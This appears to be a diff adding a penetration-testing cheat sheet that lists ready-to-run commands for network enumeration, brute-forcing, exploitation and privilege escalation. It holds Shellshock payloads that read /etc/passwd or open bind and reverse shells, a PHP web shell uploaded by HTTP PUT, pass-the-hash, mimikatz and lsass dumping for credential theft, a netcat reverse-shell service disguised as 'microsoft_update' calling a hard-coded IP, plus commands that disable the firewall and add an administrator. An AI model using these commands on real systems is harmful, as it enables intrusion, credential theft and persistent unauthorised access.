@@ -1,0 +1,297 @@
+1. Pingsweep
+2. Light Scan for each host TCP & UDP
+3. Grep ports: dns,ssh,ftp,pop3,http,https,smb,snmp,smtp,rdp,mssql,mysql,oracle,finger
+
+##################################################################
+Enumeration
+For DNS:
+        Zone Transfers
+        # AXFR (full), IXFR (incremental)
+            host <domain> <DNS SRV>
+            dig @dnsSRV domain axfr
+        DNS
+            dig a <domain> <DNS SRV>
+            dig mx <domain> <DNS SRV>
+            dig axfr <domain> <DNS SRV>
+            dnsrecon -d <target> /usr/share/wordlists/dnsmap.txt -t std --xml output.xml
+
+	Bruteforcing:
+            dnsenum -enum -f <wordlist> <client domain>
+
+For SNMP Sweeps
+        # performs tons of information about a specific system!
+        # SNMP is stateless.
+	# Community strings: public, private, community
+		onesixtyone -c <names.txt> -i <target>
+		nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes <target>
+		USER Enum:
+			/usr/sahre/doc/python-impacket/examples/samrdump.py SNMP <target>
+
+For SMTP Bounce Back
+        # Electronic mail message & can be used to assist an attacker in fingerprint the SMTP server
+        # The information includes Software & Versions. Maybe included in a bounce message.
+
+For HTTP
+                JUNK / HTTP/1.0
+                HEAD / HTTP/9.3
+                OPTIONS / HTTP/1.0
+                HEAD / HTTP/1.0
+
+                nikto -C all <target>
+                nikto -h <target>
+                uniscan -u http://<target> -qweds
+                NMAP:
+                        # wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vuls$
+                        nmap --script vulscan/vulscan.nse <target>
+                        nmap --script vulnscan/vulnscan.nse --script-args vulscandb=scipvuldb$
+                GET HEADER:
+                        curl -i <target>
+                GET EVERYTHING:
+                        curl -i -L <target>
+                CHECK FOR TITLE AND ALL LINKS
+                        curl <target> -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+                LOOK AT PAE WITH JUST TEXT
+                        curl <target> -s -L | html2text -width '99' | uniq
+
+		IF WORDPRESS
+                        wpscan -url http://<target> --enumerate p
+
+
+For FTP
+		nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <target>
+		Bruteforcing:	hydra -l <username> -P <wordlist> -f <target> ftp -V
+
+
+For POP3
+		nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <target>
+	
+For Enum NetBIOS
+		nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse <target> -p 445
+
+	    Version
+		smbclient -L <ip>
+		smbclient //<ip>/tmp
+		smbclient \\\\<ip>\\ipc$ -U <username>
+		smbclient //<ip>/ipc$ -U <username>
+            Users (max. 100)
+		nmap -sU -sS --script=smb-enum-users -p U:137,T:139 <target>
+		enum4linux -a <target>	
+
+For Remote Services
+		rsh <target> <command>
+		USERS:
+			rusers -al <target>
+		rpcinfo -p <target>
+For Finger
+		finger @<target>
+		finger <username>@<target>
+For Oracle
+		# apt-get install oscanner
+		oscanner -s <target> -P <port>
+		USER BruteForce:
+			nmap --script oracle-sid-brute <target>
+			nmap --script orace-brute <target>
+For MSSQL
+		nmap -sU --script ms-sql-info <target>
+
+        Banner Grabbing
+            nc -nv <ip> <port>
+            telnet <ip> <port>
+        
+
+For Kernel Scanning
+		xprobe2 -v -p tcp:80:open <target>
+
+
+#######################################################################
+Vulnerability Analysis
+
+    Creation of Attack Trees
+    Public Research
+        Exploit-db - http://www.exploit-db.com
+        Security Focus - http://www.securityfocus.com
+        Packetstorm - http://www.packetstorm.com
+        Security Reason - http://www.securityreason.com
+        Black Asylum - http://www.blackasylum.com/?p=160
+
+    Common/default passwords
+        http://www.phenoelit-us.org/dpl/dpl.html
+        http://cirt.net/passwords
+        http://www.defaultpassword.com
+        http://www.passwordsdatabase.com
+        http://www.isdpodcast.com/resources/62k-common-passwords/
+
+
+Exploitation
+	Brute-Forcing
+
+                FTP:
+                        hydra -l <username> -P <wordlist> -f <target> ftp -V
+		POP3:
+			hydra -l <username> -P <wordlist> -f <target> pop3 -V
+		SMTP:
+                        hydra -l <username> -P <wordlist> -f <target> smtp -V
+		RDP:
+                        hydra -l <username> -P <wordlist> -f <target> rdp -V
+		HTTP:
+			java -jar /usr/share/wordlist/dirbuster/<wordlist>
+			dirbuster
+
+
+	SAMB/SMB/Windows Domain Enumeration
+		(nbtscan-unixwiz -f <ip> > nbtscan)
+		nmblookup -A <target>
+		smbclient //MOUNT/share -I <target> -N
+		rpcclient -U "" <target>
+			srvinfo
+			enumdomusers
+			getdompwinfo
+			querydominfo
+			netshareenum
+			netshareenumall
+		enum4linux -a <target>
+
+		User ENUM:
+		/usr/share/doc/python-impacket/examples/samrdump.py <target>		
+		
+		Null Session:
+			smbclient -L //<target>
+
+	Pass-The-Hash
+		pth-winexe -U <hash> //<target> cmd
+		#apt-get install freerdp-x11
+		xfreerdp /u:<username> /pth:<hash> /v:<target>
+
+	POP3
+		Manually:
+			telnet <target> 25
+			> VRFY <username>
+
+	HTTP/HTTPS
+
+		Shellshock	
+			# git clone https://github.com/nccgroup/shocker
+			./shocker.py -H <target> --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
+			View the file: 
+				echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n | nc <target> <port>
+			Bind Shell:
+				echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc <target> <port>
+			Reverse Shell:
+				nc -nlvp <PORT>
+				echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -nv <KALI> p <PORT> -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc <target> <port>
+
+		Simple HTTP Server
+			python -m SimpleHTTPServer 80
+	
+		
+		CHECK IF IT IS POSSIBLE TO UPLOAD
+			curl -v -X OPTIONS http://<target>/
+			curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://<target>/test/shell.php
+
+		LFI/RFI
+			fimap -u "http://<target>/example.php?test="
+			ORDERED OUTPUT:
+				curl -s http://<target>/gallery.php?page=/etc/passwd
+
+
+
+Password Cracking:
+	hashcat -m 400 -a 0 <hash> /../rockyou.txt
+
+	john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>
+	john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt (decrypt)
+	john --format=decrypt <hashfile> --show
+
+
+Privilege Escalation
+
+	LINUX
+	ENUM:
+		Kernel exploits
+			site:exploit-db.com <kernel> <version>
+		Programs running as root
+			ps aux
+		Installed Software
+			/usr/local/
+			/usr/local/src
+			/usr/local/bin
+			/opt/
+			/home/
+			/var/
+			/usr/src/
+			DEBIAN:
+				dpkg -l
+			CentOS, OpenSUSE, Fedora, RHEL
+				rpm -qa
+			OpenBSF, FreeBSD
+				pkg_info
+		Weak/reused/plaintext passwords
+			find / | grep *password*
+		Inside Service
+			netstat -anlp
+			netstat -ano
+		SUID misconfiguration
+			# Binary with suid permission can be run by anyone, but when they are run they are run as root!
+			nmap (execution)
+			vim (execution)
+			nano (execution)
+			find / -perm -u=s -type -f 2>/dev/null
+			FIND ALL SUID ROOT FILES:
+				find / -user root -perm -4000 -print
+			FIND ALL SGID ROOT FILES:
+				find / -group root -perm -2000 -print
+			FIND ALL SUID & SGID FILES OWNED BY ANYONE:
+				find / -perm -4000 -o -perm -2000 -print
+			FIND ALL FILES THAT AREN'T OWNED BY ANY USER:
+				find / -nouser -print
+		Unmounted Filesystems
+			mount -l
+		Cronjob
+			crontab -l
+			ls -alh /var/spool/cron
+			ls -al /etc/ | grep cron	
+			ls -al /etc/cron*
+			cat /etc/cron*
+			cat /etc/at.allow
+			cat /etc/at.deny
+			cat /etc/cron.allow
+			cat /etc/cron.deny
+			cat /etc/crontab
+			cat /etc/anacrontab
+			cat /var/spool/cron/crontabs/root
+		Interesting Files
+			find / | grep "*.txt\|*.zip\|*.doc\|*.xls\|config*\|*.rar\|*.docx\|*.sql"
+			.ssh
+			.bash_history
+			/var/mail
+			/var/spool/mail
+
+
+	WINDOWS
+	
+	net localgroup Users
+	net localgroup Administrators
+	search dir/s *.doc
+	system(“start cmd.exe /k $cmd”)
+	sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” 	start= auto error= ignore
+	/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
+	mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”
+	Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+	mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”
+	C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
+	C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
+
+	ENABLE RDP ACCESS:
+		reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+		netsh firewall set service remoteadmin enable
+		netsh firewall set service remotedesktop enable
+
+	TURN OFF FIREWALL:
+		netsh firewall set opmode disable
+
+	ADD USER:
+		net user <username> <pw> /add
+		net localgroup administrators <username> /add
+		
+
+
